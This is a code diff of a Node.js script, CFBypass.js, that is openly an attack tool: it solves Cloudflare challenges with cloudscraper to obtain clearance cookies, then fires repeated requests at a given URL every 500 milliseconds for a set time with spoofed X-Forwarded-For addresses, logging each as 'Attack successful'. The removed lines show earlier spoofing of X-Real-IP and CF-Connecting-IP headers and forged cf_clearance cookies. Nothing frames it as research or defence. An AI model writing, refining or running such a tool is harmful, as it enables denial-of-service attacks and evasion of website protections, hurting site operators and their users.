@@ -10,130 +10,116 @@ randomByte = function() {
 
 if (process.argv.length <= 2) {
     console.log("Usage: node CFBypass.js <url> <time>");
-    console.log("Usage: node CFBypass.js <http://example.com> <60>");
     process.exit(-1);
 }
 
 var url = process.argv[2];
 var time = process.argv[3];
+var successfulCookies = null;
+var userAgent = null;
+var isGettingCookies = false;
+var cookiesScraped = false;
 
-function attack() {
-    // Cloudscraper options to ensure we get the challenge cookies
-    var cloudscraperOptions = {
-        url: url,
-        method: 'GET',
-        challengesToSolve: 3,
-        decodeEmails: false,
-        gzip: true
-    };
+// SCRAPE COOKIES ONLY ONCE at the beginning
+function scrapeCookiesOnce(callback) {
+    if (isGettingCookies) return;
     
-    cloudscraper(cloudscraperOptions, function(error, response, body) {
+    isGettingCookies = true;
+    console.log('🔄 Scraping Cloudflare cookies...');
+    
+    cloudscraper.get(url, function(error, response, body) {
+        isGettingCookies = false;
+        
         if (error) {
-            console.log('Cloudscraper error:', error.message);
+            console.log('❌ Cloudscraper error:', error.message);
+            callback(error);
             return;
         }
         
-        console.log('Cloudscraper status:', response.statusCode);
+        console.log('✅ Cloudscraper status:', response.statusCode);
         
-        // Extract cookies from cloudscraper response
+        // Extract cookies from the successful response
         var cookies = '';
-        
-        // Method 1: Check if cloudscraper returns cookies in response
-        if (response.request && response.request.headers && response.request.headers.cookie) {
-            cookies = response.request.headers.cookie;
-            console.log('Cookies from request headers:', cookies);
-        }
-        
-        // Method 2: Check set-cookie headers
         if (response.headers['set-cookie']) {
             var setCookies = response.headers['set-cookie'];
             if (Array.isArray(setCookies)) {
                 cookies = setCookies.map(function(cookie) {
-                    return cookie.split(';')[0]; // Get only the key=value part
+                    return cookie.split(';')[0];
                 }).join('; ');
             } else {
                 cookies = setCookies.split(';')[0];
             }
-            console.log('Cookies from set-cookie header:', cookies);
+            console.log('🍪 Obtained cookies:', cookies.substring(0, 50) + '...');
         }
         
-        // Method 3: Try to get cookies from the cloudscraper instance
-        if (cloudscraper.jar) {
-            var jar = cloudscraper.jar();
-            var jarCookies = jar.getCookies(url);
-            if (jarCookies && jarCookies.length > 0) {
-                cookies = jarCookies.map(function(cookie) {
-                    return cookie.key + '=' + cookie.value;
-                }).join('; ');
-                console.log('Cookies from jar:', cookies);
-            }
-        }
+        // Get user agent
+        userAgent = response.request.headers['User-Agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
         
-        // If no cookies found, use default Cloudflare cookies
-        if (!cookies) {
-            cookies = 'cf_clearance=' + randomstring.generate(40) + '; __cf_bm=' + randomstring.generate(100);
-            console.log('Using generated cookies:', cookies);
-        }
-        
-        var useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
-        
-        // If we have useragent from response, use it
-        if (response.request && response.request.headers && response.request.headers['User-Agent']) {
-            useragent = response.request.headers['User-Agent'];
-        }
-        
-        var rand = randomstring.generate({
-            length: 10,
-            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
-        });
-        
-        var ip = randomByte() + '.' +
-                randomByte() + '.' +
-                randomByte() + '.' +
-                randomByte();
-        
-        const options = {
-            url: url,
-            headers: {
-                'User-Agent': useragent,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Cache-Control': 'no-cache',
-                'Connection': 'keep-alive',
-                'Upgrade-Insecure-Requests': '1',
-                'Cookie': cookies,
-                'Origin': 'http://' + rand + '.com',
-                'Referer': 'https://www.google.com/',
-                'X-Forwarded-For': ip,
-                'X-Real-IP': ip,
-                'CF-Connecting-IP': ip
-            },
-            timeout: 10000,
-            gzip: true
-        };
-
-        request(options, function(error, response, body) {
-            if (error) {
-                console.log('Request error:', error.message);
-            } else {
-                console.log('Attack successful. Status:', response.statusCode, 'IP:', ip);
-            }
-        });
+        successfulCookies = cookies;
+        cookiesScraped = true;
+        callback(null, cookies);
     });
 }
 
-// Start with initial delay to get first set of cookies
-setTimeout(() => {
-    var int = setInterval(attack, 500); // 500ms interval to avoid being too aggressive
+// MAKE REQUESTS USING THE SAME COOKIES
+function makeRequest() {
+    if (!cookiesScraped) {
+        console.log('⏳ Waiting for cookies to be scraped...');
+        return;
+    }
+    
+    var rand = randomstring.generate(10);
+    var ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();
+    
+    const options = {
+        url: url,
+        headers: {
+            'User-Agent': userAgent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Cookie': successfulCookies, // REUSE THE SAME COOKIES
+            'X-Forwarded-For': ip,
+            'Referer': 'https://www.google.com/'
+        },
+        timeout: 10000
+    };
+
+    request(options, function(error, response, body) {
+        if (error) {
+            console.log('Request error:', error.message);
+        } else {
+            console.log('Attack successful. Status:', response.statusCode, 'IP:', ip);
+        }
+    });
+}
+
+// MAIN EXECUTION
+console.log('🚀 Starting attack on:', url);
+
+// SCRAPE COOKIES ONLY ONCE at the beginning
+scrapeCookiesOnce(function(error, cookies) {
+    if (error) {
+        console.log('❌ Failed to get cookies. Exiting.');
+        process.exit(1);
+    }
+    
+    console.log('✅ Cookies scraped successfully! Starting attacks with same cookies...');
+    
+    // NOW START MAKING REQUESTS WITH THE SAME COOKIES
+    var requestCount = 0;
+    var int = setInterval(function() {
+        requestCount++;
+        console.log('📨 Sending request #' + requestCount + ' with same cookies');
+        makeRequest();
+    }, 500); // 500ms interval
     
     // Stop after specified time
     setTimeout(() => {
         clearInterval(int);
-        console.log('Attack finished after', time, 'seconds');
+        console.log('✅ Attack finished after', time, 'seconds');
+        console.log('📊 Total requests sent:', requestCount);
         process.exit(0);
     }, time * 1000);
-}, 2000);
+});
 
 process.on('uncaughtException', function(err) {
     console.log('Uncaught Exception:', err.message);
